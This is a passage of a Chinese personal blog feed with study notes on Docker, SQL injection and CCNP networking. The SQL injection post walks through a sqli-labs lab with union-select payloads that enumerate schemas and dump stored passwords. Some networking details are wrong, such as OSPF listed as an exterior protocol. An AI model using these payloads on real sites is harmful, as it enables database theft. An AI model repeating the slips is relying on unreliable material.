查看所有/运行中的容器</p><p><code># docker inspect ContainerID</code>  查看特定容器详细信息</p><p>重启容器：</p><p><code># docker start -i ContainerID/ContainerNAME</code></p><p>删除容器：</p><p><code># docker rm ContainerID/ContainerNAME</code></p><p>设置容器的端口映射：</p><p><code># docker run -p containerPort</code><br><code># docker run -p hostPort:containerPort</code><br><code># docker run -p ip:containerPort</code><br><code># docker run -p ip:hostPort:containerPort</code></p><p>镜像操作：</p><p><code># docker images</code> 查看本地镜像<br><code># docker search IMAGENAME:tag</code> 搜索镜像<br><code># docker pull IMAGENAME:tag</code> 下载镜像<br><code># docker push IMAGENAME:tag</code> 推送上传镜像<br><code># docker rmi IMAGENAME:tag</code> 删除镜像<br><code># docker commit ContainerID/ContainerNAME NEWIMAGENAME</code> 生成镜像<br><code># docker built DOCKERFILE</code> 根据dockerfile生成镜像</p><h3><b>0x04- - docker守护式容器</b></h3><p>指在命令结束后不会自行停止的容器。</p><p>进入一个正在运行的容器：<br><code># docker attach ContainerID/ContainerNAME</code></p><p>启动守护式容器：<br><code># docker run -d</code>  后台执行容器</p><p>查看容器日志：<br><code># docker logs -f -t --tail ContainerID/ContainerNAME</code><br>-f --follows=true<br>-t --timestamps=true 时间戳<br>-tail 显示数量</p><p>查看运行进程：<br><code># docker top ContainerID/ContainerNAME</code></p><p>在运行的容器中启动进程：<br><code># docker exec -d -i -t ContainerID/ContainerNAME</code></p><p>停止守护式容器<br><code># docker stop ContainerID/ContainerNAME</code><br><code># docker kill ContainerID/ContainerNAME</code></p><h3><b>0x05- - docker Remote API远程通信</b></h3><p>Docker是一个 C/S 架构，提供了一个Remote API 将服务进程与服务器通过Socket 进行连接。docker的client端可以远程启动和连接docker服务器。<br><code># nc -U /var/run/docker.sock</code> 通过ncat 与建立与docker的sock连接。</p><p><code># vim /etc/docker/daemon.json</code> 修改启动选项</p><p><code># -h tcp://host:port</code>建立远程连接参数(server端)<br><code># -h unix://path/to/socket</code><br><code># -h fd://</code></p><p><code># -H tcp://host:port</code>建立远程参数连接(client端)<br><code># export DOCKER_HOST=&quot;tcp://host:port&quot;</code> 通过修改环境变量进行远程连接</p><h3><b>0x06- - DOCKERFILE 详解</b></h3><p>越到后面的时候，越觉得dockerfile这个模式有点爽。相当于写了一个sh的脚本，运行脚本后能直接构造出我需要的镜像。不再需要创建后自己手动apt-get update 或是映射端口等操作。一条命令即可复线出一个环境。</p><p><b>构建过程</b>：<br>从基础镜像中运行一个容器。<br>执行命令，修改容器。<br>执行commit类操作，提交一个新的镜像层，<br>运行新的镜像层，删除刚才的容器，继续执行命令并重复此流程直至dockerfile内的命令结束。</p><p><b>语法格式</b>：<br>#：注释<br>UPPER lower：/命令/参数</p><p><b>常见命令</b>：<br>FROM &lt;image&gt;&lt;tag&gt; 制定已经存在的镜像，必须是第一条非注释语句<br>MAINTAINER &lt;name&gt; 作者信息、联系方式<br>RUN &lt;command&gt; docker内运行的命令<br>EXPOSE &lt;port&gt; docker启用的端口<br>CMD &lt;command param1 param2&gt; 容器启动后在前台运行命令，在运行时会被覆盖<br>ENTRYPOINT&lt;command param1 param2&gt; 容器启动后在前台运行命令，在运行时不会被覆盖<br>ADD &lt;src&gt;...&lt;dest&gt; 提供tar功能的文件映射<br>COPY &lt;src&gt;...&lt;dest&gt; 文件映射<br>VOLUME &lt;data&gt; 向运行中的容器添加卷<br>WORKDIR /path/to/workdir 在容器工作时设置容器的工作路径<br>USER daemon 设置容器运行的身份，默认是Root用户<br>ONBUILD 设置触发器。当一个镜像被其他镜像作为基础镜像时执行。</p><p><code># docker built --no-cache</code>不使用缓存进行构建。<br><code># docker history IMAGENAME</code> 查看镜像构建过程</p><h3><b>0x07- - docker-compose 详解</b></h3><p>一开始的时候很不明白docker-compose和dockerfile的关系(其实就是自己根本没写一下这两样东西的原因)。看了几个大佬们github上的复线题目，大概明白了一点这之间的关系。</p><p>首先，docker-compose是一个命令工具。可以通过pip进行安装。docker-compose会根据当前目录下的docker-compose.yml配置文件进行一系列的操作，而你所要做的只是输入一条命令：</p><p><code># docker-compose up</code></p><p>之后所有的一切都会自动运行。</p><p>这里和dockerfile的区别在于，一个dockerfile只能使用一个容器，而docker-compose则没有这个限制。除此之外，docker-compose还支持使用dockerfile进行创建镜像。</p><p>所以只要我们了解了docker-compose。yml的语法格式，就能写出一个一键式创建的docker环境。</p><h4><font color="blue">语法</font><br></h4><p><b>vserion</b></p><p>所有的docker-conpsoe.yml文件都是以版本号为开头的，一般写为2或3，表示使用的是 Docker-compose 2 或是 Docker-compose 3。</p><pre class=" language-language-yml"><code class="language-language-yml">version:"3"</code></pre><p><b>service</b></p><p>service是docker的第二大部分，其中包含了创建容器所用的镜像，端口，网络设置等等。</p><pre class=" language-language-yml"><code class="language-language-yml">service: #详细信息开始标签continer1: #第一个容器标签，编写者可自定义image:ubuntu:14.04 #使用的镜像continer2:built: #也可以通过built来进行镜像创建context: ../ #表示dockerfile文件的目录，也可以是git的urldockerfile: path/to/dockerfile #表示dockerfileargs: #环境变量password=1 #环境变量值也可以是空image: webapp:tag #当使用built创建镜像时还存在image标签，则创建的镜像名以image内容命名。labels: #标签-"com.example.description=Accounting webapp"</code></pre><h3><b>0x08- - docker 网络</b></h3><p>网桥:docker0<br>地址划分：172.17.42.1<br>子网掩码：255.255.0.0<br>MAC:02:42:ac:11:00:00-02:42:ac:11:ff:ff 共65534个地址<br>使用网桥管理工具可以查看:bridge-utils<br><code># brctl show</code> 查看网桥连结</p><p>同时也可以通过ifconfig对docker网段进行修改，来获得自定义的网段资源和IP资源。<br>也可以通过网桥管理工具新建一个网桥代替docker0，达到不修改docker0的条件下实现自定义。</p><p><code># vim /etc/defualt/docker/</code>添加：DOCKER_OPS -b=br0</p><p>对于访问的限制，docker同样可以通过iptables防火墙的规则进行配置。</p><h3><b>0x09- - docker 数据管理</b></h3><p>这里其实是一个很大的坑，最开始使用docker的时候不理解容器和镜像的区别，对容器进行的修改和一些文件的存储都直接进行了操作，然后删除容器之前没有commit成新的镜像，导致数据全部丢失。。。<br>所以通常使用映射的方式对docker的存储：数据卷进行操作。</p><p>由于对于数据要求永久化，而容器的生命周期往往不能够满足，所以docker使用数据卷----经过特殊设计的目录，绕过联合文件系统(UFS)，为一个或者多个容器进行访问。</p><p>简单的来讲，数据卷更像是类似端口的一种映射，将宿主主机的文件或者文件目录映射到使用的容器当中，这样即使容器删除或者停止，数据目录依然是存储在宿主主机当中，形成了数据独立分离于容器的生存周期。</p><p><code># docker run -v ~/datavalume:/data IMAGENAME</code> 运行一个映射了数据卷的容器</p><p><code># docker run -v ~/datavalume:/data:ro IMAGENAME</code><br>设置权限:只读</p><p>当我们将数据卷的挂在写在dockerfile中时，是无法创建不存在的目录和共享到其他容器的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Docker&lt;/h1&gt;
&lt;hr&gt;
&lt;center&gt;&lt;small&gt;2018-12-26&lt;/small&gt;&lt;/center&gt;
(ﾟ∀。) 最近莫名的开了好几个新的文章，操作系统还没整理完密码学的编码也没继续记录完，然后我又开了一个docker......我可能是个傻子吧。
&lt;p</summary>
      
    
    
    
    <category term="Tools" scheme="http://blog.dvkunion.cn/categories/Tools/"/>
    
    
    <category term="容器" scheme="http://blog.dvkunion.cn/tags/容器/"/>
    
    <category term="环境搭建" scheme="http://blog.dvkunion.cn/tags/环境搭建/"/>
    
  </entry>
  
  <entry>
    <title>Web-SQL</title>
    <link href="http://blog.dvkunion.cn/2019/05/06/Web-SQL/"/>
    <id>http://blog.dvkunion.cn/2019/05/06/Web-SQL/</id>
    <published>2019-05-06T06:51:31.000Z</published>
    <updated>2022-01-05T05:43:55.925Z</updated>
    
    <content type="html"><![CDATA[<h1>Web-SQL</h1><hr><center><small>2019-5-6</small></center><p>这周开始 SQL注入 的学习和总结，从基础部分到深入的理解各种注入手段。</p><center><small>2019-5-14</small></center><p>一个重要的数据库:information_schema<br>三张重要的表:schemata、tables、columns</p><center><small>华丽的分割线</small></center><hr><h3><b>0x01- - 什么是SQL注入<b></b></b></h3><p>在动态的Web应用中，数据库是不可缺少的元素之一。动态类的网站通常需要动态脚本在后台进行不断的数据库操作，将数据从数据库中取出或是修改。进行这种操作的脚本通常会构造出一个符合 SQL语法 的查询语句，然后通过数据库-脚本语言的插件，对数据库进行增删改查的操作。</p><p>SQL注入，就是在脚本语言构造查询语句的时候，通过传入一些特殊的字符或是特定的数据库函数参数，从而实现对数据库的任意操作，达到攻击目的。</p><p>SQL语句具有灵活、通用的优点，所以通常动态SQL语句都是在执行的过程中创建的。在这个过程中如果没有对一些敏感函数和特殊符号进行过滤，构造出的SQL语则会可能带有强力的攻击性。</p><p>手画一幅图来更好的表达我的意思：</p><p><img src="https://cdn.dvkunion.cn/blog/20190506/oCD96K2MLzRo.png" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190506/oCD96K2MLzRo.png" srcset="/css/images/overlay.gif" alt="mark"></p><p>灵魂画手。但是应该可以简单的表达出一次Sql注入攻击。</p><p>练习SQL注入时，可以通过LAMP环境搭建一个练习靶场，如sqli-labs、dvwa等等。</p><p>放一个 Ms17010实验室的在线SQLi-labs环境，在这里感谢大佬贡献的练习靶机:</p><p><a href="http://43.247.91.228:84/" target="_blank" rel="noopener">http://43.247.91.228:84/</a></p><h3><b>0x02- - SQL注入的原理<b></b></b></h3><p>首先我们看一个正常的SQL查询语句：</p><p><code>select * from users where id = $id</code></p><p>正常的操作下，$id 是我们输入的一个变量，当我们输入 id=1 时，数据库会带入这条SQL语句 进行查询 id=1 的用户信息，并将查询结果反馈给我们。</p><p>当我们进行攻击时，我们输入 $id=1 and 1=1 ,没有过滤的情况下，数据库会带入 $id 内所有的参数进行查询，查询语句则变成了这样：</p><p><code>select * from users where id = 1 and 1=1</code></p><p>id=1 为真，1=1 也为真，与逻辑下 查询结果为真。所以依旧会查询到 id=1 的用户信息。当我们换成 and 1=2时:</p><p><code>select * from users where id = 1 and 1=2</code></p><p>此时 1=2为假，与逻辑下 查询结果为假，因此查询不到任何数据，返回结果为空。</p><p>据此即可判断，此处存在SQL注入漏洞，我们可以构造更多的 payload 进行攻击。</p><h3><b>0x03- - SQL注入的分类<b></b></b></h3><p>常见的注入攻击有：报错注入、盲注、Union注入等等。</p><p>按照工具：手动注入、工具注入。</p><p>进阶：宽字节注入、时间注入、堆叠注入、二次注入、cookie注入、base64注入、XFF注入。</p><p>说到底，SQL注入是在利用输入过滤不严谨和数据库的SQL语句特性进行攻击。所以对于不同的数据库攻击的方式也不完全相同。这里大多数例子都以 mysql 数据库为例。</p><p><b> Union 注入</b></p><p>通过 SQL语法 中的 union select 联合查询进行注入。</p><h3><b>0x04- - SQL注入练习<b></b></b></h3><p>练习部分主要以sqli-labs为主，外加一些CTF平台的经典题目。</p><h4><font color="blue">sqli-labs</font><br></h4><p><b>Less-1:GET-Error Based-String quotes - String</b></p><p>第一题开头应该是最简单的，首先带入'单引号进行fuzz测试</p><p><img src="https://cdn.dvkunion.cn/blog/20190514/mWNCxs98K1AU.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/mWNCxs98K1AU.png?imageslim" srcset="/css/images/overlay.gif" alt="mark"></p><p>发现报错，并切后面出现了 limit 字样，说明后面存在多余的语句，我们需要注释掉后面的语句才能运行。<br>传参 id=1' order by 1%23 判断列数，在4时报错</p><p><img src="https://cdn.dvkunion.cn/blog/20190514/NB1YtWkMUYxo.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/NB1YtWkMUYxo.png?imageslim" srcset="/css/images/overlay.gif" alt="mark"></p><p>说明一共存在三列，我们开始构造union查询：<br>id=-1' union select 1,2,3%23</p><p><img src="https://cdn.dvkunion.cn/blog/20190514/kImfWSWEjnlr.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/kImfWSWEjnlr.png?imageslim" srcset="/css/images/overlay.gif" alt="mark"></p><p>得到了数据对应的列的位置，我们在这几个位置使用union对数据进行其他数据库查询即可：</p><p>id=-1%27%20%20union%20select%201,user(),3%23 查询数据库用户名</p><p><img src="https://cdn.dvkunion.cn/blog/20190514/H85ENgRVg8Pf.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/H85ENgRVg8Pf.png?imageslim" srcset="/css/images/overlay.gif" alt="mark"></p><p>id=-1%27%20%20union%20select%201,database(),3%23 查询当前数据库名</p><p><img src="https://cdn.dvkunion.cn/blog/20190514/u677htpChFE9.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/u677htpChFE9.png?imageslim" srcset="/css/images/overlay.gif" alt="mark"></p><p>我们也可以直接爆所有存在的数据库：</p><p>id=-1%27%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata%20%23</p><p><img src="https://cdn.dvkunion.cn/blog/20190514/bign3RmOAjcc.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/bign3RmOAjcc.png?imageslim" srcset="/css/images/overlay.gif" alt="mark"></p><p>然后我们可以利用 mysql中的一个特殊数据库进行爆表：</p><p>id=-1' union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database()%23</p><p>group_concat可以将内容按照要求的以默认的逗号打印出来，占一列的值。</p><p><img src="https://cdn.dvkunion.cn/blog/20190514/KVmUo4gN7P9t.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/KVmUo4gN7P9t.png?imageslim" srcset="/css/images/overlay.gif" alt="mark"></p><p>爆出了表名，我们可以继续查询表内字段名：</p><p>id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='emails'%23</p><p><img src="https://cdn.dvkunion.cn/blog/20190514/nyVNYaN18SFr.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/nyVNYaN18SFr.png?imageslim" srcset="/css/images/overlay.gif" alt="mark"></p><p>同样也可以对users表进行查询：</p><p>id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'%23</p><p><img src="https://cdn.dvkunion.cn/blog/20190514/TLBktVJWYTJd.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/TLBktVJWYTJd.png?imageslim" srcset="/css/images/overlay.gif" alt="mark"></p><p>发现存在关键字段password,我们去爆出所有的password</p><p>id=-1' union select 1,2,group_concat(password) from security.users %23</p><p><img src="https://cdn.dvkunion.cn/blog/20190514/i6l6StGSBHHz.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/i6l6StGSBHHz.png?imageslim" srcset="/css/images/overlay.gif" alt="mark"></p><p>得到所有人的密码。</p><p>这样是通过了Union进行的注入，同样这题也可以通过报错注入得到结果。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Web-SQL&lt;/h1&gt;
&lt;hr&gt;
&lt;center&gt;&lt;small&gt;2019-5-6&lt;/small&gt;&lt;/center&gt;
&lt;p&gt;这周开始 SQL注入 的学习和总结，从基础部分到深入的理解各种注入手段。&lt;/p&gt;
&lt;center&gt;&lt;small&gt;2019-5-14&lt;/small&gt;&lt;</summary>
      
    
    
    
    <category term="Reading" scheme="http://blog.dvkunion.cn/categories/Reading/"/>
    
    
    <category term="笔记" scheme="http://blog.dvkunion.cn/tags/笔记/"/>
    
  </entry>
  
  <entry>
    <title>CCNP</title>
    <link href="http://blog.dvkunion.cn/2019/03/02/CCNP/"/>
    <id>http://blog.dvkunion.cn/2019/03/02/CCNP/</id>
    <published>2019-03-02T00:52:29.000Z</published>
    <updated>2022-01-05T05:43:55.918Z</updated>
    
    <content type="html"><![CDATA[<h1>CCNP</h1><hr><center><small>2019-3-2</small></center><p>GNS<br>Cisco-packet-tracer<br><br></p><center><small>华丽的分割线</small></center><hr><h3><b>0x00- - 简介和基础</b></h3><p>CCNP实际上是一个认证类的考试。CCNP全称是：Cisco Certified Network Professional——思科认证网络高级工程师。</p><p>工作方向：路由交换，安全，ISP服务商，数据中心DC，无线，语音。</p><p><b>网络连通性的两种测试：</b><br>ping:(ICMP)<br>原理：发送Echo request、接收Echo reply</p><p>traceroute:(UDP 33434/33435/33436)<br>原理：TTL值+ICMP错误消息。</p><p><b>网络线缆：</b><br>1.交叉线  568A 568B<br>2.直通线  568B 568B</p><blockquote><p>568B 橙白 橙 绿白 蓝 蓝白 绿 棕白 棕<br>568A 绿白 绿 橙白 蓝 蓝白 橙 棕白 棕<br>不同类型设备之间使用交叉线。<br>相同类型设备之间使用直通线。<br>普通网线只能在100m内通信。</p></blockquote><p>3.console线(反转线，全反线) 连接路由和交换机等设备</p><p>4.串口线：早期广域网链路</p><h3><b>0x01- - OSI七层模型</b></h3><p><b>ISO：</b><br>国际标准化组织（International Organization for Standardization，ISO）简称ISO，是一个全球性的非政府组织。<br><b>目的：</b><br>1.简化通信网络的复杂性，便于网络的学习。<br>2.为每一个层次定义响应的功能。下层需要为上层提供标准化服务。<br>3.标准化所有厂商的接头和协议。</p><p><b>OSI：</b><br>OSI是Open System Interconnection的缩写，意为开放式系统互联。国际标准化组织（ISO）制定了OSI模型。</p><p>由高到低分别为：</p><ul><li><b>1.应用层(Applacation)： </b>为应用程序提供网络的接口。</li><li><b>2.表示层(Presentation)： </b>进行数据的编码转换、压缩，翻译数据格式。</li><li><b>3.会话层(Session)： </b>区分和控制不同的会话连接。</li></ul><blockquote><p>上三层一般由软件工程师进行考虑与建设。</p></blockquote><ul><li><b>4.传输层(Transport)：</b>提供可靠的连接(TCP)，同时进行数据校验(CRC校验)</li><li><b>5.网络层(Network)：</b> 定义逻辑地址(IP、ISIS)；提供路由的选择并进行维护；以及进行路由<font color="red">数据包</font>的转发等操作。(路由器、三层交换机)</li><li><b>6.数据链路层(Data Link)：</b>定义物理地址(MAC：media access control)，通过媒介访问控制将<font color="red">数据帧</font>发送到目的主机。(以太网交换机)</li><li><b>7.物理层(Physical)：</b>为网络提供可靠的传输环境，负责<font color="red">比特流</font>的发送与接收。(集线器 hub)</li></ul><p>观察上述红色部分可以发现，OSI为每一层定义了数据的单位---<b>PDU</b></p><ul><li><b>上三层：</b>data 数据</li><li><b>传输层：</b>segement 数据段封装</li><li><b>网络层：</b>packet 数据包</li><li><b>数据链路层：</b>frame 数据帧</li><li><b>物理层：</b>bit 比特流：由0、1构成的一长串二进制。</li></ul><p><b>集线器被替代的原因：</b></p><blockquote><p>冲突域：如果在一个网络的两台计算机在通信时会发生冲突，则这个网络就是一个冲突域。会导致数据帧的破损。</p></blockquote><blockquote><p>广播域：广播的范围。<br>集线器所有接口在一个冲突域。<br>交换机的一个接口就是一个冲突域。<br>交换机所有的接口都在一个广播域。<br>路由器一个接口就是一个广播域。</p></blockquote><h3><b>0x02- - TCP/IP协议簇</b></h3><p><b>协议：</b><br>网络协议的简称，网络协议是通信计算机双方必须共同遵从的一组约定。<br><b>TCP/IP协议：</b><br>互联网协议（Internet Protocol Suite）是一个网络通信模型，以及一整个网络传输协议家族，为互联网的基础通信架构。它常被通称为TCP/IP协议族（英语：TCP/IP Protocol Suite，或TCP/IP Protocols），简称TCP/IP。<br>一般分为五层或四层：</p><ul><li><b>1.应用层：</b>FTP(21)、Telnet(23)、Http(80)、Smtp(25)、DNS(53)、RIP(路由信息协议 520)、Snmp(简单网络管理协议 161)、Tftp(简单文件传输协议 69)。</li><li><b>2.传输层：</b>TCP(transmission control protocol)、UDP(user datagram protocol)</li></ul><blockquote><p>TCP是面向连接(发送数据之前建立连接，发送数据时维护连接，发送数据结束拆除连接)、可靠的用户传输协议。<br>TCP通过 &quot;三次握手&quot; 建立连接; &quot;四次握手&quot;拆除连接。<br>UDP是非面向连接，不可靠的传输协议。</p></blockquote><ul><li><b>3.网络层：</b>IP(internet protocol):、ICMP：(Internet control management protocol);ARP/RARP ()地址解析协议/地址反向解析协议。</li><li><b>4.数据链路层：</b>以太网协议；HDLC协议；PPP协议。</li><li><b>5.物理层(4、5整合可以称为网络接口层)</b></li></ul><p><b>TCP包头：(20 bytes)</b><br>Source port(16 b);<br>Destination port (16 b);</p><blockquote><p>这两部分用于区分上层应用层协议。<br>1-1023：知名端口。保留给知名的应用层协议<br>1024-65535：随机高端口。 发送方随机高端口向目的主机的特定端口发起TCP连接。</p></blockquote><p>Sequence number 序列号 (16 b);<br>Acknowledgement number 确认号 (16 b);<br>Data;</p><p><b>UDP包头：(8 bytes)</b><br>Source port(16 b);<br>Destination port (16 b);<br>check num(16 b);<br>(16 b);<br>Data;</p><p><b>IP包头：(unkown Bytes)</b><br>version(4 b);</p><blockquote><p>版本：ipv4 0100; ipv6 0110;</p></blockquote><p>header length(4 b);</p><blockquote><p>头部长度： 范围20byte-60byte之间</p></blockquote><p>Priority &amp; type of service(8 b);</p><blockquote><p>用于区分不同网络流量，实现QOS</p></blockquote><p>Total length(16 b);</p><blockquote><p>总长度：说明四层以后负载的大小。</p></blockquote><p>iDentification(16 b)/Flags(3 b)/flagment offset (13 b)；</p><blockquote><p>标识/标记/偏移量：用来对数据包进行分片。<br>MTU值(最大传输单元) 最大只能传输1500 byte,所以在传输中经常对数据包进行分片。<br>标识：标记同一个数据包。<br>标记：第几个包。<br>偏移量：开始位置。</p></blockquote><p>Time To live(8 b);</p><blockquote><p>限制数据包存活时间(存活范围)，防止数据包环路<br>每经过一台三层设备该值减一<br>常见TTL：255、192、128、64。</p></blockquote><p>Protocl(8 b);</p><blockquote><p>协议号：标记上层(传输层)使用的协议。<br>6：TCP<br>17：UDP<br>1：ICMP<br>2：IGMP internet管理协议</p></blockquote><p>Header checksun(16 b);</p><blockquote><p>头部校验：校验IP数据包头部的完整性。</p></blockquote><p>Source IP Address(32 b);<br>Destination IP Address(32 b);</p><blockquote><p>源IP/目的IP</p></blockquote><p>Options;<br>Data;</p><p><b>ARP协议：</b><br>Win : arp -a<br>Route : show arp<br>arp存放时间是4个小时。</p><p><b>RARP协议：</b></p><p>已经被DHCP取代：software:169.254.0.0/16</p><h3><b>0x03- - IP与子网掩码</b></h3><p>IP(Internet Protocol):网络之间的协议<br><b>概念:</b><br>为计算机网络相互连接进行通信而设计的协议。个人把IP理解为在这个网络中每台主机的地址：如，xx省xx市xx街xx小区xxx<br><b>组成：</b><br>网络号+主机位<br>主机位全为0代表网络号：如127.0.0.0<br>主机位全为1代表广播地址：如127.255.255.255<br><b>分类：</b><br>对IP的数据进行分类，有如下：</p><ul><li>A:1.0.0.1-127.255.255.254 适用于超大型网络，可容纳 2^24-2 台主机</li><li>B:128.0.0.1-191.255.255.254 适用于大型网络，可容纳 2^16-2 台主机</li><li>C:192.0.0.1-223.255.255.254 适用于小型网络，可容纳 2^8-2 台主机</li></ul><blockquote><p>A、B、C三种被称作单播IP地址。两台主机想要网络互通必须IP地址为这三类</p></blockquote><ul><li>D:224.0.0.1-239.255.255.254 此类地址没有网络号和主机位的概念，用于组播标识组号。</li><li>E:240.0.0.1-255.255.255.254 保留地址，多用于科研。</li></ul><p>对IP的使用进行分列，有如下：</p><p>公网IP：<br>除私网地址以外的IP地址</p><p>私网地址：<br>10.0.0.0-10.255.255.255<br>172.16.0.0-172.31.255.255<br>192.168.0.0-192.168.255.255</p><p>私网地址优点：<br>提高网络安全性，节约IPv4网络空间</p><p><b>子网掩码：</b><br>子网掩码是用来判断任意两台主机是否属于同一个子网络。<br>子网掩码与IP一一对应，为32bit。<br>子网掩码<br>VLSM 可变长子网掩码：<br>例--将10.1.1.0/24划分为两个子网，可以通过这样的方式--向主机位借位作为网络位:<br>10.1.1.0/25<br>10.1.1.128/25</p><h3><b>0x04- - 路由设备与基本路由协议</b></h3><p>路由器作用：可以实现不同网段之间的互联和互通。<br>路由：路由器收到IP数据包，去查找路由信息进行转发的过程。<br>路由信息：去往目的网络的一条信息，指明了去往目的网络的方向。<br>路由表：存放路由信息的表。<br>路由表存放的信息：目的地址网络号，子网掩码，下一跳地址，出接口，路由的类型，AD 管理距离，Metric 开销。</p><p>路由器依据路由表转发IP数据包，当路由表内不存在匹配的路由时，路由器就会丢弃该数据包。</p><p>路由分类：<br>直连路由和非直连路由</p><p>直连路由：指物理上直接连接的路由。会随着接口状态的改变而消失。</p><p>非直连路由：指物理上没有直接连接的路由。非直连路由又分为 静态路由 和 动态路由两种。</p><p>静态路由：人为手工在路由上进行配置路由信息的路由。</p><p>动态路由：主要有两个协议：距离矢量路由协议、链路状态路由协议。</p><p>距离矢量路由协议：RIP EIGRP BGP 基于流言的协议</p><p>链路状态路由协议：OSPF ISIS 地图协议</p><p>从协议的工作范围，路由器可以分为IGP路由、EGP路由。</p><p>IGP：RIP EIGRP ISIS内部网关工作协议  一个区域内内部运行的路由协议</p><p>EGP：BGP OSPF外部网关工作协议  在区域系统之间运行的路由协议</p><p>早期分类：<br>有类路由协议：RIP　IGRP (主类路由 A:X.0.0.0/8 B:Y.Y.0.0/16)</p><p>无类路由协议：EOGRP OSPF ISIS BGP(无类别路由,携带子网掩码)</p><p>查表原则：<br>1.最长掩码匹配原则。<br>2.递归查询原则。</p><p>AD管理距离</p><p>C-----0<br>S-----1<br>RIP---120<br>EIGRP-90/170/5<br>OSPF--110<br>ISIS--115<br>BGP---20/200<br>255---过滤</p><p>作用：从不同的路由协议学习到的相同的路由条目，比较进行管理。</p><p>Metric开销：<br>比较同一种协议去往目的网络的开销</p><p><b>静态路由</b></p><p>由管理员手工配置的路由条目</p><p>配置语法：</p><p><code>ip route 网络号 子网掩码 出接口/下一跳地址</code></p><p>既要配置转发echo request的路由表，也要配置echo reply的路由表。</p><p>如果是以太网形式，静态路由尽可能跟下一跳地址。(代理ARP):no ip proxy-arp<br>如果是串行链路，既可以跟下一跳，也可以跟出接口。</p><p>静态路由全网联通：每一台路由都要配置与自己非直连路由的静态路由。</p><p>静态路由特例：<br>默认路由：ip route 0.0.0.0 0.0.0.0 出接口/下一跳地址。<br>一般用作网络的出口。</p><p>浮动静态路由：通过修改静态路由的管理实现备份。<br>若存在两条静态路由容易构成负载均衡。浮动静态路由可以做到另一条路由作为另一条的备份。<br>当其中一条路径出现问题，备份路径则生效。</p><p>总结：<br>优点：配置简单、CPU不需要计算路由条目、稳定。<br>缺点：不适用于大型网络、不能适应网络拓扑的变化、消耗网络资源。</p><p><b>动态路由<br>路由器自动形成路由表，自动适应网络拓扑变化。</b></p><p>RIP:(Routing Information Protocol)<br>特点：<br>1.属于IGP，典型的DV协议(没有拓扑概念)<br>2.基于UDP协议，端口是520 RIP|UDP 502|IP 17<br>3.周期性以广播/组播的方式发送路由更新。<br>4.完整更新，路由表里面的路由条目。<br>5.算法-贝尔曼福特算法：使用跳数坐座位rip的度量值。<br>6.支持等价的负载均衡(去往目的由多个路径，路由metric相同)。<br>7.Rip有两个版本：RIPv1,RIPv2。</p><p>RIPv1:<br>1.有类别的路由协议(不携带子网掩码)<br>2.广播的方式发送路由更新 广播地址:255.255.255.255<br>3.在主类边界自动汇总<br>4.不能支持VLSM(可变长子网掩码)<br>5.不能支持路由认证和打标<br>6.不能支持第三方下一跳次优路径(重分布)<br>7.不支持不连续子网,</p><p>RIPv2:</p><p>router rip 进入到rip进程<br>version 1 选择版本<br>Network 宣告原则：按主类的方式进行宣告。<br>例：network 192.168.1.0 172.16.0.0<br>含义：被network包含的路由器上所有被激活的接口启RIP进程。</p><p><code>show ip protocols</code></p><p>接口所属的网段放进rip的数据库。</p><p><code>show ip rip database</code></p><p>利用辅助地址构建连续子网。<br>一个接口下可以配多个辅助地址。</p><p><code>ip address 地址 掩码 secondary</code></p><p><code>show ip int brief</code></p><p>1，路由器模式详解：<br>Router&gt; 用户模式，通常用来查看统计信息，但不能修改路由器的设置。<br>Router# 特权模式，可以查看并修改路由器的配置，通常在这里运行show命令。<br>Router(config)# 全局模式，在这里修改当前运行配置中的内容。<br>Router(config-if)# 接口模式，用来配置路由器的物理接口和环回接口。<br>Router(config-line)# 控制台接口模式<br>Router(config-subif)#  子接口模式，用来配置在路由器中创建的逻辑接口.<br>Router(config-router)#  路由协议接口模式，在这里配置路由协议，如RIP、OSPF、IGRP等。</p><p>2，登录cisco设备必要的配置：<br>Router&gt;enable  //进入特权模式<br>Router#configure terminal   //进入全局模式<br>Router(config)#hostname R1    //配置路由器的主机名<br>R1(config)#no ip domain-lookup  //关闭动态的域名解析,作用是当我们输入错误命令的时候，路由器会认为这条命令没有错误，它只是一个域名的形式，路由器会进行解析，从而浪费宝贵的时间。<br>R1(config)#line console 0    //进入控制台<br>R1(config-line)#exec-timeout 0 0  //关闭控制台的会话超时，也可用命令no exec-timeout，当长时间不去操作路由器的时候，路由器会自动的终止与我们的对话连接，跳转到非连接状态，此时需要输入enable重新进入特权模式，对我们的操作十分的不方便。<br>R1(config-line)#logging synchronous //关闭日志同步，抑制控制台的提示信息，使得路由器发送的控制台屏幕的消息不会附加到命令行中。</p><p>3，cisco设备的基本配置<br>Router(config)#hostname NGR1  //修改路由器主机名<br>Router#clock set 13:01:01 10 july 2007配置路由器时间：<br>Router#show clock   //查看路由器当前时间<br>Router(config)#enable password cisco //  特权模式的明文密码<br>Router(config)#enable secret cisco  // 特权模式的密文密码<br>Router(config)#service password-encryption<br>//将路由器中所有明文密码变为加密的形式<br>Router#copy running-config startup-config  保存路由器当前配置</p><p>VTY口的配置<br>Router(config)#line vty 0 4<br>Router(config-line)#password [password]<br>Router(config-line)#login<br>Router(config-line)#exit</p><p>配置以太网接口地址<br>Router#conf  t<br>Router(config)#interface E0/0  进入接口<br>Router(config-if)#ip address 192.168.1.1 255.255.255.0  //配置IP地址<br>Router(config-if)#no shutdown  //激活该接口</p><p>配置串行接口（需要配置时钟频率）<br>Router#conf  t<br>Router(config)#interface S0<br>Router(config-if)#clock rate 64000 //DCE 